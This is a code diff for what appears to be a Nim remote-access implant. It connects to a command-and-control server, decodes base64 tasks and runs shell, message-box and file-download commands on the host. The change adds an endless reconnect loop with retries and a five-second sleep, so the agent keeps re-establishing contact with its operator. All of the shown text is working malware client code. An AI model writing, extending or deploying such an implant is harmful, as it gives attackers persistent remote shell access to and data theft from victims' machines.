@@ -1,15 +1,13 @@
-import net, base64, json
+import net, base64, json, os
 
 import modules, communication
 
 import ../commands/[shell, msgbox, download]
 
-let client: Socket = newSocket()
+var client: Socket = newSocket()
 
 const port {.intdefine.}: int = 1234
 const ip {.strdefine.}: string = "127.0.0.1"
-
-client.connect(ip, Port(port))
 
 proc receiveCommands(client: Socket) =
   client.connectToC2()
@@ -17,8 +15,8 @@ proc receiveCommands(client: Socket) =
     let line = client.recvLine()
 
     if line.len == 0:
-      echo "server down"
-      quit(0)
+      client.close()
+      break
 
     let task = decode(line)
 
@@ -41,6 +39,14 @@ proc receiveCommands(client: Socket) =
     of "download":
       download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())
 
-receiveCommands(client)
-  
-client.close()
+
+while true:
+  try:
+    client.connect(ip, Port(port))
+  except OSError:
+    continue
+  receiveCommands(client)
+  client = newSocket()
+  sleep(1000*5)
+
+# 
